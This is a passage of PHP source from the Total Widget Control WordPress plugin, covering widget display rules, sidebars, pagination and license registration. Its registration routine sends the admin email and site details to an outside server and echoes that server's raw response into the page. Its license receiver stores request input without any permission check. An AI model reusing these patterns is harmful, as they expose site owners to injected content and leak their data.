	{
		$widget['callback'][0]->number = $widget['number'];
		$widget['callback'][0]->id = $widget['id'];
	}
	
	//loading settings
	if (is_object($widget['callback'][0]) && is_callable( array($widget['callback'][0], 'get_settings') ))
	{
		$params = $widget['callback'][0]->get_settings();
		$widget['p'] = $params[$widget['number']];
	}
	elseif ( !$widget['multiwidget'] )
	{
		//take the data handling into our own hands if this is not a multiwidget
		$singles = get_option('twc_single_widget_data', array());
		$widget['p'] = @$singles[$widget['id']];
	}
	
	//just making sure that we dont throw errors later
	if (!isset($widget['p']['twcp_default_sidebar']))
	{
		$widget['p']['twcp_default_sidebar'] = '';
	}
	if (!isset($widget['p']['twcp_inherit_sidebar']))
	{
		$widget['p']['twcp_inherit_sidebar'] = '';
	}
	if (!isset($widget['p']['twcp_exclude_sidebar']))
	{
		$widget['p']['twcp_exclude_sidebar'] = '';
	}
	
	$twc_registered_widgets[$widget_id] = $widget;
	return $widget;
}

/**
 * function is responsible for returning the complete sidebar info
 *
 */
function twc_get_widget_sidebar()
{
	//initializing variables
	global $wp_registered_sidebars;
	$widget = twc_widget_object();
	$sidebar_id = twc_get_widgets_sidebar($widget['id']);
	
	return $wp_registered_sidebars[$sidebar_id];
}

/**
 * function returns the position and the sidebar for a given widget
 * 
 * @TODO Need to create a separate function that will be called to return the position value
 * @TODO This function should only return a sidebar as a value, if the type is sidebar
 * 
 * @param unknown_type $widget_id
 * @param unknown_type $type
 * @return unknown
 */
function twc_get_widgets_sidebar( $widget_id, $type = 'sidebar' )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	static $flipped;
	
	if (!isset($flipped))
	{
		unset($sidebars_widgets['wp_inactive_widgets']);
		foreach ((array)$sidebars_widgets as $_sidebar => $widgets)
		{
			foreach ((array)$widgets as $position => $widgetid)
			{
				$flipped[$widgetid] = array(
						'sidebar' => $_sidebar,
						'position' => (int)trim($position),
					);
			}
		}
	}
	
	//return sidebar info
	if ($type == 'position')
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 0;
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
	else // if sidebar
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 'wp_inactive_widgets';
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
}

/**
 * this function adds the 'add new' button to the list page
 *
 */
function twc_h2_add_new()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	if ($current_screen->action != '') return;
	
	echo '<a href="'.admin_url('widgets.php?action=add').'" class="button add-new-h2">'.__('Add New','twc').'</a>';
}

/**
 * function is responsible for checking to see if a widget has a wrapper
 *
 * @param string|array $widget
 */
function twc_has_wrapper( $widget )
{
	if (is_string($widget) && $widget)
	{
		$widget = twc_get_widget_by_id($widget);
	}
	
	//initializing variables
	$hasWrapper = (isset($widget['p']['twcp_wrapper_file']) && $widget['p']['twcp_wrapper_file']);
	if (!isset($widget['p']['twcp_wrapper_file']))
		$wrapper = $widget['p']['twcp_wrapper_file'] = '';
	$wrapper = $widget['p']['twcp_wrapper_file'];
	
	//reasons to return
	if ($hasWrapper && $wrapper && is_file($wrapper) && file_exists($wrapper)) 
	{
		twc_display_debug($widget['id'].' has wrapper');
		return true;
	}
	return false;
}

/**
 * This does our checking to see if the current view is for active of 
 * inactive widgets
 *
 * @return boolean
 */
function twc_inactive_list()
{
	return (isset($_REQUEST['inactive']) && $_REQUEST['inactive'] == 'inactive');
}

/**
 * This initializes the twc system with the proper hooks.
 *
 * @return null
 */
function twc_initialize()
{
	//initializing variables
	global $twc_table_type, $twc_widgetlistings_type, $twc_has_displayed;
	$twc_table_type = $twc_widgetlistings_type = 'default';
	$twc_has_displayed = false;
	
	wp_register_script( 'twc-nav-menu', plugin_dir_url(__file__).'js/twc-nav-menu.js', array(), TWC_VERSION);
	wp_register_script( 'twc-base', plugin_dir_url(__file__).'js/twc.js', array(), TWC_VERSION);
	wp_register_script( 'twc-qtip', plugin_dir_url(__file__).'js/tooltips.js', array(), TWC_VERSION);
	wp_register_script( 'twc-sortables', plugin_dir_url(__file__).'js/sortables.js', array(), TWC_VERSION);
	
	wp_register_style( 'twc', plugin_dir_url(__file__).'css/twc.css', array(), TWC_VERSION, 'all');
	wp_register_style( 'twc-sortables', plugin_dir_url(__file__).'css/twcSortables.css', array(), TWC_VERSION, 'all');
	
	add_shortcode('widget', 'twc_shortcode_widget');
	add_shortcode('sidebar', 'twc_shortcode_sidebar');
		
	add_action('activate_'.plugin_basename(dirname(__file__)).DS.'index.php', 'twc_activate_plugin');
	add_action('deactivate_'.plugin_basename(dirname(__file__)).DS.'index.php', 'twc_deactivate_plugin');
	add_action('sidebar_admin_setup', 'twc_init', 100);
	add_action('admin_notices', 'twc_view_switch', 1);
	add_action('admin_notices', 'twc_needs_activation', 100);
	add_action('admin_init', 'twc_set_object_id');
	add_action('admin_head', 'twc_admin_head');
	add_action('init', 'twc_clear_license',1);
	add_action('init', 'twc_clear_originals',1);
	add_action('init', 'twc_add_javascript');
	add_action('init', 'twc_registration', 1);
	add_action('init', 'twc_receive_license', 1);
	add_action('init', 'twc_show_ajax', 500);
	add_action('init', 'twc_initial_notification_setup');
	add_action('twc_notifications', 'twc_display_notifications');
	add_action('twc_init', 'twc_add_help_text', 18);
	add_action('twc_init', 'twc_admin_notices');
	add_action('twc_init', 'twc_view_widget_wrap', 20);
	add_action('twc_init', 'twc_destruct', 100);
	add_action('twc_display_admin', 'twc_view_auth');
	add_action('twc_display_admin', 'twc_register');
	add_action('twc_display_admin', 'twc_manual_license');
	add_action('twc-register', 'twc_register');
	add_action('twc-table', 'twc_retrieve_widgets', 5);
	add_action('twc-table', 'twc_rows', 10);
	add_action('twc-table-rows', 'twc_table_row');
	add_action('twc-table-rows', 'twc_table_row_empty');
	add_action('widgets_init', 'init_registered_widgets', 1);
	add_action('twc-free-registration', 'twc_activation' );
	add_action('admin_menu', 'f20_add_metaboxes');
	add_action('save_post', 'f20_metabox_save_data');
	add_action('wp_footer', 'twc_show_object_id');
	add_action('wp', 'twc_sortable_initialize');
	add_action('wp', 'twc_set_object_url');
	add_action('twc_empty_sidebar', 'twc_sidebar_originals', 20, 1);
	add_action('plugins_loaded', 'twc_current_user_can');
	
	add_filter('twc-save-widget-fields', 'twc_save_menu_items',20,1);
	add_filter('contextual_help_list', 'twc_contextual_pro');
	add_filter('gettext', 'twc_gettext');
	add_filter('plugin_action_links_total-widget-control/index.php', 'twc_add_action_links');
	add_filter('plugin_row_meta', 'twc_plugin_row_meta', 10, 2);
	add_filter('twc_widget_display', 'twc_sortable_wrapper', 1000, 2);

	function twc_table_row(){ twc_show_view('twc-table-row'); }
	function twc_table_row_empty(){ twc_show_view('twc-table-empty'); }
	function twc_manual_license(){twc_show_view('twc-manual-license');}
	function twc_register(){ twc_show_view('twc-register'); }
	function twc_init(){ if (!twc_list_style_twc()) return; do_action('twc_init'); }
	function twc_destruct(){ _520(); exit(); }
	function twc_admin_notices(){ add_action('admin_notices', 'read_520_rss'); }
	function twc_view_screen_options(){ return twc_get_show_view('twc-screen-options'); }
	function twc_view_help_home(){ return twc_get_show_view('twc-help-home'); }
	function twc_view_help_edit(){ return twc_get_show_view('twc-help-edit'); }
	function twc_view_help_add(){ return twc_get_show_view('twc-help-add'); }
	function twc_view_widget_wrap(){ twc_show_view('twc-widget-wrap'); }
	function twc_view_auth(){ twc_show_view('twc-auth'); }
	if (!array_key_exists('TWCAUTH', $GLOBALS)) $GLOBALS['TWCAUTH'] = true;
	if (function_exists('twc_widget_protitle')) define("TWC_LICENSE", 'pro');
	
	f20_register_metabox(array(
	    'id' => 'my-meta-box',
	    'title' => 'Total Widget Control',
	    'page' => true,
	    'context' => 'normal',
	    'priority' => 'high',
	    'fields' => array(
	        array(
	            'name' => '',
	            'desc' => '',
	            'id' => 'twc-meta-listings',
	            'type' => 'show_view',
	            'std' => ''
	        ),
	    )
	));
}

/**
 * function is responsible to determine if the widget will display on this page.
 *
 * @param string|object $widget
 * @param boolean $debug
 * @return boolean
 */
function twc_is_widget_displaying( $widget, $debug = false )
{
	//initializing variables
	static $widgets_displaying;
	if (is_string($widget)) $widget = twc_get_widget_by_id($widget);
	
	if (!isset($widgets_displaying))
	{
		$widgets_displaying = array();
	}
	
	
	//RETURN IF WE HAVE ALREADY BEEN HERE, DONE THIS
	if ( !$debug && isset($widgets_displaying[$widget['id']]) ) return $widgets_displaying[$widget['id']];
	
	
	//IF THE WIDGET IS BRAND NEW, JUST SHOW IT
	if ( $debug && twc_is_widget_new( $widget ) ) twc_display_debug('display '.$widget['id'].' because its brand new');
	if ( twc_is_widget_new( $widget ) ) return $widgets_displaying[$widget['id']] = true; 
	
	
	//initializing variables
	global $twc_menu_item_object;
	$object_id = twc_get_object_id();
	$objects = twc_get_widget_objects( $widget );
	
	
	//THIS SECTION IS FOR EXACT MATCHES USING THE OBJECT IDS
	if ($object_id) //is active for current page
	{
		$objectIdMatch = (is_array($objects['menu-item-object-id']) && in_array($object_id, (array)$objects['menu-item-object-id']));
		$objectMatch = ( $widget['p']['twc_menu_item'][$object_id]['menu-item-object'] == $twc_menu_item_object );
		
		//the object type and the object id's match
		if ( $debug && $objectMatch && $objectIdMatch ) twc_display_debug('display '.$widget['id'].' because its objects match');
		if ( $objectMatch && $objectIdMatch ) return $widgets_displaying[$widget['id']] = true;
	}
	
	
	//THIS IS FOR EXACT URL MATCHES
	$urlMatch = (is_array($objects['menu-item-url']) && in_array(twc_get_object_url(), $objects['menu-item-url']));
	if ( $debug && $urlMatch ) twc_display_debug('display '.$widget['id'].' because its urls match');
	if ( $urlMatch ) return $widgets_displaying[$widget['id']] = true;
	
	
	//THIS NEXT SECTION IS FOR INHERITED DISPLAY SETTINGS
	if ($object_id && $twc_menu_item_object && isset($widget['p']['twcp_inherit_sidebar']) && $widget['p']['twcp_inherit_sidebar'] == 'inherit')
	{
		// for pages
		if ( $twc_menu_item_object == 'page' )
		{
			if ($parents = get_post_ancestors($object_id))
			{
				foreach ((array)$parents as $parent_id)
				{
					if (!in_array($parent_id, $objects['menu-item-object-id'])) continue;
					if ( $debug ) twc_display_debug('display '.$widget['id'].' because it an inherited page');
					return $widgets_displaying[$widget['id']] = true;
				}
			}
		}
		// for taxonomies
		elseif ( taxonomy_exists($twc_menu_item_object) && isset($objects['menu-item-object']) )
		{
			foreach ($objects['menu-item-object'] as $menu_id => $menu_type)
			{
				if ( $menu_type != $twc_menu_item_object ) continue;
				if ( !cat_is_ancestor_of( $menu_id, $object_id ) ) continue;
				if ( $debug ) twc_display_debug('display '.$widget['id'].' because it an inherited taxonomy');
				return $widgets_displaying[$widget['id']] = true;
			}
		}
		// for posts
		elseif ( $twc_menu_item_object == 'post' )
		{
			foreach ($objects['menu-item-object'] as $menu_id => $menu_type)
			{
				//reasons to continue
				if ( $menu_type != 'post' && !taxonomy_exists($menu_type) ) continue;
				
				//initializing variables
				$term_ids = wp_get_object_terms( $object_id, $menu_type, array('fields' => 'ids') );
				
				//reasons to continue
				if ( !in_array( $menu_id, $term_ids ) ) continue;
				if ( $debug ) twc_display_debug('display '.$widget['id'].' because it an inherited taxonomy');
				return $widgets_displaying[$widget['id']] = true;
			}
		}
	}
	
	//WE DIDN'T MATCH ANYTHING
	if ( $debug ) twc_display_debug('don\'t display '.$widget['id'].' because nothing matched');
	return $widgets_displaying[$widget['id']] = false;
}

/**
 * Function determines if the widget has been modified in any way
 *
 * @param string|object $widget
 * @param boolean $include_objects
 * @return boolean
 */
function twc_is_widget_new( $widget, $include_objects = true )
{
	//initializing variables
	if (is_string($widget)) $widget = twc_get_widget_by_id($widget);
	
	if ($include_objects)
	{
		$objects = twc_get_widget_objects( $widget );
	}
	
	//reasons widget is TWC
	if ($include_objects && !empty($objects)) return false;
	if (isset($widget['p']['twcp_exclude_sidebar']) && $widget['p']['twcp_exclude_sidebar'] == 'exclude') return false;
	if (isset($widget['p']['twcp_default_sidebar']) && $widget['p']['twcp_default_sidebar'] == 'default') return false;
	//if (isset($widget['p']['twcp_status']) && $widget['p']['twcp_status'] == 'disabled') return false;
	//if (isset($widget['p']['twcp_publish_time']) && $widget['p']['twcp_publish_time'] > time()) return false;
	//if (isset($widget['p']['twcp_visibility']) && $widget['p']['twcp_visibility'] != 'public') return false;
	//if (isset($widget['p']['twcp_visible_parent']) && $widget['p']['twcp_visible_parent'] == 'parent') return false;
	
	//widget is brand new
	return true;
}

/**
 * This function manages the view style. Upon first call it will check
 * which view is to be used.
 *
 * @return boolean
 */
function twc_list_style_twc()
{
	//initializing variables
	static $view;
	global $current_user;
	get_currentuserinfo();
	
	if (!isset($view) && isset($_REQUEST['list_style']) && $style = $_REQUEST['list_style']) //querystring
	{
		$view = $style;
	}
	elseif (!isset($view)) //db
	{
		$view = get_user_option( 'twc_list_style', $current_user->ID );
	}
	else //already set
	{
		return ($view == 'twc');
	}
	
	update_user_option($current_user->ID, 'twc_list_style', $view);
	return ($view == 'twc');
}

/**
 * function is responsible for displaying the "activation needed" image.
 *
 * @return null
 */
function twc_needs_activation()
{
	//initializing variables	
	$current_screen = twc_get_current_screen();
	
	//reasons to fail
	if (!$GLOBALS['TWCAUTH']) return false;
	if ($current_screen->parent_base == 'themes') return false;
	
	echo '<a href="'.admin_url('widgets.php?list_style=twc').'" style="display:block;width:900px;margin:10px auto;"><img src="'.plugin_dir_url(__file__).'images/activate.png"/></a>';
}

/**
 * function is responsible for adjusting the plugin meta links on the plugin page
 *
 * @param array $plugin_meta
 * @param string $plugin_file
 * @return array $plugin_meta
 */
function twc_plugin_row_meta( $plugin_meta, $plugin_file )
{
	//reasons to fail
	if ('total-widget-control/index.php' != $plugin_file) return $plugin_meta;
	
	//initializing variables
	if (isset($plugin_meta[2])) unset($plugin_meta[2]);
	$plugin_meta[] = '<a href="http://totalwidgetcontrol.com/codex/62-2/" target="_blank">'.__('Documentation','twc').'</a>';
	$plugin_meta[] = '<a href="http://totalwidgetcontrol.com/questions-answers/" target="_blank">'.__('Support Forum','twc').'</a>';
	$plugin_meta[] = '<a href="http://www.codecongo.com/" target="_blank">'.__('Get More Widgets','twc').'</a>';
	
	return $plugin_meta;
}

/**
 * Function returns a drop down of the current widgets position
 *
 * @param unknown_type $sidebar_id
 * @param unknown_type $default
 * @param string $name
 * @return string
 */
function twc_position_select_box( $sidebar_id, $default, $name = null )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$list = $sidebars_widgets[$sidebar_id];
	
	if (is_null($name))
	{
		$name = $sidebar_id;
	}
	
	$select = '<select id="sidebar_position'.'" name="'.$name.'_position'.'" class="twc_position_select_box">';
	
	if (count($list) == 0)
	{
		$select .= "<option value='0'>0</option>";
	}
	
	$last = count($list);
	for ($i = 1; $i <= $last; $i++)
	{
		$selected = '';
		if ($default == ($i-1)) $selected = 'selected=selected';
		$select .= "<option $selected value='".($i-1)."'>$i</option>";
		
		//create a last position
		if ($i == $last) $select .= "<option $selected value='".($i)."'>Last</option>";
	}
	return $select.'</select>';
}

/**
 * function creates the wrapper folder and returns a list of files
 * within that folder.
 * 
 * @TODO Function should also copy the default wrappers to the created folder
 *
 * @return unknown
 */
function twc_read_wrapper_files()
{
	//initializing variables
	$themepath = TwcPath::clean(get_theme_path().DS.'widget-wrappers'.DS);
	$pluginpath = TwcPath::clean(dirname(__file__).DS.'widget-wrappers'.DS);
	
	if (!is_dir($themepath)) TwcPath::create($path, 0777);
	
	$themefiles = TwcPath::byrd_files($themepath, $filter = '.', $recurse = false, $fullpath = true);
	$pluginfiles = TwcPath::byrd_files($pluginpath, $filter = '.', $recurse = false, $fullpath = true);
	$files = (array)$themefiles + (array)$pluginfiles;
	
	$headers = array(
		'wrapperTitle' => __('Wrapper Title','twc'),
		'description' => __('Description','twc'),
	);
	
	foreach ((array)$files as $file)
	{
		if (!file_exists($file)) continue;
		$file_data[$file] = get_file_data($file, $headers);
	}
	
	return $file_data;
}

/**
 * Builds the row data, we do this outside of the model, for pagination purposes.
 *
 * @param string $action
 * @return null
 */
function twc_rows( $action = 'default' )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twcp_pagi, $twc_rows;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$sidebars = array();
	$current_screen = twc_get_current_screen();
	$twc_rows = array();
	$twcp_pagi = apply_filters('twcp_pagination_defaults', array(
		'total' => 0,
		'per_page' => 20,
		'page' => (isset($_REQUEST['pa'])) ?$_REQUEST['pa'] :1,
		'pages' => '',
		'start' => '',
		'stop' => '',
	));
	
	//reasons to fail
	if (!empty($current_screen->action) && $action == 'default') return false;
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			$widget = twc_get_widget_by_id($widget_slug);
			if (!$widget) continue;
			
			switch ($action)
			{
				case 'on-page':
					//initializing variables
					$display = twc_is_widget_displaying($widget);
					
					//reasons to continue
					$display = apply_filters('twc_display_widget', $display, $widget);
					if (!$display) continue;
						
					//setting variables
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					
					break;
				default:
				//show inactive widgets
				if (twc_inactive_list() && $sidebar_slug == 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					continue;
				}
				if (twc_inactive_list()) continue;
				
				
				//show filtered items
				if (twc_filter_list_for() == $sidebar_slug)
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					continue;
				}
				if (twc_filter_list_for()) continue;
				
				
				//show only active items
				if (!twc_inactive_list() && $sidebar_slug != 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					continue;
				}
				break;
			}
			
		endforeach;
	endforeach;
	
	if ($search = twc_search_list_for())
	foreach ($twc_rows as $sidebar_slug => $sidebar):
	
		if (is_array($sidebar))
		foreach ($sidebar as $position => $widget):
			foreach ($widget as $widget_slug => $widget):
			
				switch ($action)
				{
					case 'on-page': break; //no searching built into the edit page metabox
					default:
					$match = false;
						
					//show searched for items
					$title = apply_filters('twc_widget_title', ((isset($widget['p']['title'])) ?$widget['p']['title'] :''), $widget);
					
					if (isset($widget['p']['title']) && strpos(strtolower($widget['p']['title']), strtolower($search)) !== false) $match = true;
					if (strpos(strtolower($widget_slug),strtolower($search)) !== false) $match = true;
					if (strpos(strtolower($title),strtolower($search)) !== false) $match = true;
					if ($match) continue;
					
					$twcp_pagi['total']--;
					unset($twc_rows[$sidebar_slug][$position][$widget_slug]);
				}
				
			endforeach;
		endforeach;
	endforeach;
	
	//calculate the number of pages
	$twcp_pagi['pages'] = ceil(($twcp_pagi['per_page'] > 0) ?$twcp_pagi['total'] / $twcp_pagi['per_page'] :1);
	$twcp_pagi['start'] = ($twcp_pagi['per_page'] * $twcp_pagi['page']);
	$twcp_pagi['start'] = ($twcp_pagi['start'] >= $twcp_pagi['per_page']) ?$twcp_pagi['start'] - $twcp_pagi['per_page']+1 :$twcp_pagi['start'];
	$twcp_pagi['stop'] = $twcp_pagi['per_page'] * $twcp_pagi['page'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] == 0) ?$twcp_pagi['stop'] + $twcp_pagi['per_page'] :$twcp_pagi['stop'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] > $twcp_pagi['total']) ? $twcp_pagi['total'] :$twcp_pagi['stop'];
	$twcp_pagi = apply_filters('twcp_pagination', $twcp_pagi);
}

/**
 * This takes care of the alternating row colors without all the messy code
 * in my table rows
 */
function twc_row_alternate( $echo = true )
{
	//initializing variables
	static $alternate;
	
	if (!isset($alternate))
	{ 
		$alternate = 0;
	}
	else
	{
		$alternate++;
	}
	
	if ($alternate)
	{
		$alternate = -1;
		if ($echo)
		{
			echo 'alternate';
		}
		else 
		{
			return 'alternate';
		}
	}
}

/**
 * registers the inactive widgets sidebar
 * 
 * @return null
 */
function twc_register_placeholder_sidebar()
{
	// register the inactive_widgets area as sidebar
	register_sidebar(array(
		'name' => __('Trashed Widgets'),
		'id' => 'wp_inactive_widgets',
		'description' => '',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
	));
}

/**
 * function is responsible for pinging for a license and redirecting if necessary
 * 
 * @TODO Bookmarking the registration
 * 
 * @return unknown
 */
function twc_registration()
{
	//loading libraries
	require_once ABSPATH.'wp-admin'.DS.'includes'.DS.'plugin.php';
	
	//initializing variables
	global $twc_paypal;
	$args = array();
	$twc_paypal = false;
	$current_screen = twc_get_current_screen();
	$first = get_option('twc_unique_registration_key', true);
	$uniqueID = get_option('twc_unique_registration_key', create_guid());
	update_option('twc_unique_registration_key', $uniqueID);
	
	//reasons to fail
	if ($current_screen->action != 'register') return false;
	if (isset($_REQUEST[$uniqueID]) || !isset($_REQUEST['license'])) return false;
	
	//initializing variables
	$headers = get_plugin_data( dirname(__file__).DS.'index.php' );
	$url = "http://community.5twentystudios.com/?view=register-for-free&affiliate=".TWC_AFFILIATE_ID."&ver=".urlencode($headers['Version'])."&domain=".f20_get_domain()."&return_url=".urlencode(get_bloginfo('url'))."&email=".get_bloginfo('admin_email')."&unique=$uniqueID&type=";
	
	switch($_REQUEST['license'])
	{
		case '1':  
			remove_all_actions("twc_display_admin");
			add_action('twc_display_admin', 'twc_register');
			$type = 'twc-pro'; 
			break;
		case '2':
			remove_all_actions("twc_display_admin");
			add_action('twc_display_admin', 'twc_register');
			$type = 'twc-ent'; 
			break;
		case '10': return; break;
		default: 
			$type = 'twc-free';
			break;
	}
	$url = $url.$type;
	
	//debug logging
	twc_error_log("Requesting {$type} License : $url");
	
	//making the call
	$headers = wp_remote_get( $url, $args );
	$twc_paypal = wp_remote_retrieve_body($headers);
	
	//this redirects after activation
	if ($type == 'twc-free') do_action('twc-free-registration'); 
	
	if (is_wp_error( $twc_paypal ))
	{
		twc_error_log("wp_remote_get returned an error.");
	}
	elseif (is_string($twc_paypal) && !empty($twc_paypal))
	{
		twc_error_log("Redirecting the user to paypal.");
		if (!headers_sent())
		{
			$twc_paypal = trim(str_replace("\r\n", '', $twc_paypal));
			if (substr($twc_paypal,0,7) != 'http://' && substr($twc_paypal,0,8) != 'https://')
			{
				echo $twc_paypal;
			}
			else
			{
				wp_redirect($twc_paypal);
			}
			exit();
		}
	}
	return false;
}

/**
 * function is responsible for saving the license file if its sent
 *
 * @return false
 */
function twc_receive_license()
{
	//initializing variables
	$uniqueID = get_option('twc_unique_registration_key', false);
	
	//reasons to fail
	if (!isset($_REQUEST[$uniqueID])) return false;
	
	update_option('twc_received_a_license', true);
	
	$licenses = get_option('twc_licenses',array());
	$licenses[f20_get_domain()] = $_REQUEST[$uniqueID];
	update_option('twc_licenses',$licenses);
	
	//debugging logs
	$licenses = get_option('twc_licenses',array());
	if (empty($licenses[f20_get_domain()]))
	{
		twc_error_log("The license is <span style='color:red;'>NOT</span> saving to the database.");
	}
	else 
	{
		twc_error_log("The license saved <span style='color:green;'>OK</span>.");
	}
	
	return die('done : success');
}

/**
 * look for "lost" widgets, this has to run at least on each theme change
 *
 * @return null
 */
function twc_retrieve_widgets()
{
	//start of the retreive bit
	global $wp_registered_widget_updates, $wp_registered_sidebars, $sidebars_widgets, $wp_registered_widgets;

	//preparing the sidebars
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	$_sidebars_widgets = array();
	$sidebars = array_keys($wp_registered_sidebars);

	unset( $sidebars_widgets['array_version'] );

	$old = array_keys($sidebars_widgets);
	sort($old);
	sort($sidebars);

	if ( !is_admin() ) return;
	//if ( $old == $sidebars ) return;

	// Move the known-good ones first
	foreach ( $sidebars as $id ) {
		if ( array_key_exists( $id, $sidebars_widgets ) ) {
			$_sidebars_widgets[$id] = $sidebars_widgets[$id];
			unset($sidebars_widgets[$id], $sidebars[$id]);
		}
	}

	// if new theme has less sidebars than the old theme
	if ( !empty($sidebars_widgets) ) {
		foreach ( $sidebars_widgets as $lost => $val ) {
			if ( is_array($val) )
				$_sidebars_widgets['wp_inactive_widgets'] = array_merge( (array) $_sidebars_widgets['wp_inactive_widgets'], $val );
		}
	}

	// discard invalid, theme-specific widgets from sidebars
	$shown_widgets = array();
	foreach ( $_sidebars_widgets as $sidebar => $widgets ) {
		if ( !is_array($widgets) )
			continue;

		$_widgets = array();
		foreach ( $widgets as $widget ) {
			if ( isset($wp_registered_widgets[$widget]) )
				$_widgets[] = $widget;
		}
		$_sidebars_widgets[$sidebar] = $_widgets;
		$shown_widgets = array_merge($shown_widgets, $_widgets);
	}

	$sidebars_widgets = $_sidebars_widgets;
	unset($_sidebars_widgets, $_widgets);

	// find hidden/lost multi-widget instances
	$lost_widgets = array();
	foreach ( $wp_registered_widgets as $key => $val ) {
		if ( in_array($key, $shown_widgets, true) )
			continue;

		$number = preg_replace('/.+?-([0-9]+)$/', '$1', $key);

		if ( 2 > (int) $number )
			continue;

		$lost_widgets[] = $key;
	}

	$sidebars_widgets['wp_inactive_widgets'] = array_merge($lost_widgets, (array) $sidebars_widgets['wp_inactive_widgets']);
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Function appends the widget wrapper values to the instance fields
 *
 * 
 * @param array $fields
 * @return array
 */
function twc_save_default_sidebar( $fields, $new_instance, $old_instance, $widget )
{
	//initializing variables
	$fields = wp_parse_args( $fields, $old_instance );
	$request = wp_parse_args((array)$_POST['widget-'.$widget->id_base][$widget->number], $_REQUEST);
	
	if (array_key_exists('twcp_default_sidebar', $request))
		$fields['twcp_default_sidebar'] = $request['twcp_default_sidebar'];
	
	if (array_key_exists('twcp_exclude_sidebar', $request))
		$fields['twcp_exclude_sidebar'] = $request['twcp_exclude_sidebar'];
	
	if (array_key_exists('twcp_inherit_sidebar', $request))
		$fields['twcp_inherit_sidebar'] = $request['twcp_inherit_sidebar'];
	
	if (array_key_exists('twcp_wrapper_file', $request))
		$fields['twcp_wrapper_file'] = $request['twcp_wrapper_file'];
	
	if (array_key_exists('twcp_widget_title', $request))
		$fields['twcp_widget_title'] = $request['twcp_widget_title'];
	
	if (array_key_exists('twcp_status', $request))
		$fields['twcp_status'] = $request['twcp_status'];
	
	if (array_key_exists('twcp_visibility', $request))
		$fields['twcp_visibility'] = $request['twcp_visibility'];
	
	if (array_key_exists('twcp_publish_time', $request))
		$fields['twcp_publish_time'] = $request['twcp_publish_time'];
	
	if (array_key_exists('twcp_visible_parent', $request))
		$fields['twcp_visible_parent'] = $request['twcp_visible_parent'];
	
	if (array_key_exists('twc_menu_item', $request))
		$fields['twc_menu_item'] = $request['twc_menu_item'];
		
	return $fields;
}

/**
 * Deprecated since 1.6.0
 */
function twc_save_menu_items( $fields )
{
	return $fields;
}

/**
 * Function accepts the widget id and the sidebar and saves the 
 * relationship.
 *
 * @param string $widget_id
 * @param string $sidebar_id
 */
function twc_save_widget_sidebar( $widget_id, $sidebar_id, $position = 0, $delete = false )
{
	if (!$widget_id || TWC_CURRENT_USER_CANNOT)
		return false;
	
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	// remove old position
	foreach ( $sidebars_widgets as $key => $sb )
	{
		$sidebars_widgets[$key] = array_diff( (array)$sb, array($widget_id) );
	}
	
	array_splice( $sidebars_widgets[$sidebar_id], $position, 0, $widget_id );
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * This function accepts fields for a given widget and saves those fields to the db.
 *
 * @param string $widget_id
 * @param array $fields
 */

function twc_save_widget_fields( $widget_id, $post )
{
	//initializing variables
	if (!$widget_id || TWC_CURRENT_USER_CANNOT)
	{
		wp_redirect( admin_url('widgets.php?message=0') );
		exit;
	}
	
	//initializing variables
	global $wp_registered_widget_updates;
	$fields = $post;
	$_POST = array();
	$widget = twc_get_widget_by_id($widget_id);
	$id_base = _get_widget_id_base($widget['id']);
	$ignore = array('sidebar_slug','id_base','widget-width','widget-height',
	'widget_number','multi_number','action','redirect','editwidget','addnew','base','num',
	'view');
	
	
	if ($widget['multiwidget'])
	{
		//variable as constructed by wordpress
		if (isset($post['widget-'.$id_base])
		&& isset($post['widget-'.$id_base][$widget['number']]))
		{
			$fields = $post['widget-'.$id_base][$widget['number']];
		}
	}
	
	//filtering the fields
	foreach ($fields as $key => $value)
	{
		if (in_array($key, (array)$ignore))
		{
			unset($fields[$key]);
		}
	}
	

	if ($widget['multiwidget'])
	{
		$_POST['widget-'.$id_base][$widget['number']] = apply_filters('twc-save-widget-fields', $fields);
		$_POST['multi_number'] = $widget['number'];
	}
	else
	{
		$_POST = apply_filters('twc-save-widget-fields', $fields);
		
		//take the data handling into our own hands if this is not a multiwidget
		$singles = get_option('twc_single_widget_data', array());
		$singles[$widget['id']] = $_POST;
		update_option('twc_single_widget_data', $singles);
	}
	
	//this calls the widgets update function with the given params
	foreach ( (array) $wp_registered_widget_updates as $name => $control )
	{
		if ( $name != $id_base || !is_callable($control['callback']) )
			continue;
	
		ob_start();
			call_user_func_array( $control['callback'], $control['params'] );
		ob_get_clean();
		break;
	}
	return true;
}

/**
 * 
 *
 * @return unknown
 */
function twc_search_list_for()
{
	if (!isset($_REQUEST['twcp_search_input']) || empty($_REQUEST['twcp_search_input'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_search_input'];
}

/**
 * function is responsible for setting the current url
 *
 */
function twc_set_object_url()
{
	//initializing variables
	global $twc_menu_item_url;
	
	//reasons to fail
	if (isset($twc_menu_item_url)) return $twc_menu_item_url;
	$twc_menu_item_url = f20_get_page_url();
	$twc_menu_item_url = str_replace(array('?twc_debug','&twc_debug'), '', $twc_menu_item_url);
